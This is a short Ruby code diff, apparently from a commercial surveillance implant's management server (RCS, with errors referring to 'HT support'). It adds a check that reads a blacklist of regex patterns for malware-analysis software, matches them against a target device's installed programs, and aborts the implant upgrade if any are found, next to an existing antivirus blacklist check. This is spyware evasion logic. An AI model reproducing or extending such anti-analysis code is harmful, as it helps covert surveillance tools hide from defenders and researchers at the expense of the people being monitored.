@@ -491,6 +491,7 @@ class Item
 
     installed = device[:data]['content']
 
+    # check for installed AV
     File.readlines(RCS::DB::Config.instance.file('blacklist')).each do |offending|
       offending.chomp!
       next unless offending
@@ -502,6 +503,19 @@ class Item
         raise "The target device contains a software that prevents the upgrade."
       end
     end
+
+    # check for installed analysis programs
+    File.readlines(RCS::DB::Config.instance.file('blacklist_analysis')).each do |offending|
+      offending = offending.split('#').first
+      offending.strip!
+      offending.chomp!
+      next unless offending
+      if Regexp.new(offending, Regexp::IGNORECASE).match(installed)
+        trace :warn, "Analysis software detected: #{offending}"
+        raise "The target device contains malware analysis software. Please contact HT support immediately"
+      end
+    end
+
   end
 
   def self.offload_destroy(params)
